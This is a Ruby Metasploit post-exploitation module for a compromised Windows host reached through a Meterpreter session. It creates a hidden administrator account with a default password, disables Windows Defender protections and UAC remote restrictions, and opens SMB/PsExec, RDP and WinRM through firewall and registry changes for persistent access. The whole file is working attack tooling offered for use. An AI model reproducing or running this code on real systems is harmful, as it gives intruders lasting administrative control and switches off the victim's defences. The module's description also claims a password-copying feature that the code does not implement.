##
# This module requires Metasploit Framework and a Meterpreter session.
# Save in /home/kali/.msf4/modules/post/multi/exec/create_persistence.rb
##

require 'msf/core'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  require 'ipaddr'
  require 'socket'

  def get_tun0_ip
    begin
      Socket.getifaddrs.each do |iface|
        if iface.name == 'tun0' && iface.addr&.ipv4?
          return iface.addr.ip_address
        end
      end
    rescue
    end
    nil
  end

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Create a new Administrator user and enable PSExec, RDP and WinRM',
      'Description'   => %q{
        This module creates a new Administrator user on the target system and enables
        PSExec, RDP and WinRM services. It also configures the firewall to allow
        incoming connections for these services. The new user will have the same password
        as the current user, and the module will attempt to set the password to a known
        value if the current user's password is not retrievable.
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['x4v1l0k <x4v1l0k@gmail.com>'],
      'Platform'      => ['windows'],
      'SessionTypes'  => ['meterpreter']
    ))

    register_options(
      [
        OptString.new('USER',       [true,  'Username to create', 'x4v1l0k']),
        OptString.new(  'PASSWORD',       [true,  'Password for the username', 'Password123!']),
        OptString.new(  'TARGET_GROUP',       [true,  'Target group for the new user', 'Administrators']),
        OptBool.new(  'DISABLE_DEFENDER', [false, 'Disable Windows Defender', true]),
        OptBool.new(  'ENABLE_PSEXEC', [true, 'Enable PSExec service', true]),
        OptBool.new(  'ENABLE_RDP', [true, 'Enable RDP service', true]),
        OptBool.new(  'ENABLE_WINRM', [true, 'Enable WinRM service', true])
      ]
    )
  end

  def run
    unless session.type == 'meterpreter'
      print_error("This module requires a Meterpreter session.")
      return
    end

    unless session.platform == 'windows'
      print_error("This module is only supported on Windows.")
      return
    end

   # Attempt to create a new user with the provided username and password
    output = cmd_exec("net user #{datastore['USER']}")
    if output.include?('The user name could not be found')
        begin
            cmd_exec("net user #{datastore['USER']} #{datastore['PASSWORD']} /add")
        rescue ::Exception => e
        print_error("Failed to create user: #{e.class} #{e}")
        return
        end
    end

    output = cmd_exec("net localgroup #{datastore['TARGET_GROUP']}")
    if not output.include?('alias does not exist')
        begin
            cmd_exec("net localgroup #{datastore['TARGET_GROUP']} #{datastore['USER']} /add")
        rescue ::Exception => e
        print_error("Can't add the new user to the target group: #{e.class} #{e}")
        return
        end
    end

    # Disable Windows Defender if requested
    if datastore['DISABLE_DEFENDER']
        begin
            cmd_exec('powershell -c Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableBlockAtFirstSeen $true; Set-MpPreference -DisableIOAVProtection $true')
            print_good("Windows Defender has been disabled.")
        rescue ::Exception => e
            print_error("Failed to disable Windows Defender: #{e.class} #{e}")
            return
        end
    end

    # Enable PSExec service if requested
    if datastore['ENABLE_PSEXEC']
        begin
            cmd_exec("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f")
            cmd_exec("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f")
            cmd_exec('netsh advfirewall firewall set rule name="File and Printer Sharing (SMB-In)" new enable=yes')
            cmd_exec('sc config LanmanServer start= auto')
            cmd_exec('sc query LanmanServer')
            print_good("PSExec service enabled successfully.")
        rescue ::Exception => e
        print_error("Failed to enable PSExec service: #{e.class} #{e}")
        return
        end
    end

    # Enable RDP service if requested
    if datastore['ENABLE_RDP']
        begin
            cmd_exec('reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f')
            cmd_exec('netsh advfirewall firewall set rule group="remote desktop" new enable=yes')
            print_good("RDP service enabled successfully.")
        rescue ::Exception => e
            print_error("Failed to enable RDP service: #{e.class} #{e}")
            return
        end
    end

   # Enable WinRM service if requested
    if datastore['ENABLE_WINRM']
        begin
            cmd_exec('powershell -c Enable-PSRemoting -force')
            cmd_exec('netsh advfirewall firewall add rule name="WinRM" dir=in action=allow protocol=TCP localport=5985')
            print_good("WinRM service enabled successfully.")
        rescue ::Exception => e
          print_error("Failed to enable WinRM service: #{e.class} #{e}")
          return
        end
    end
  end
end
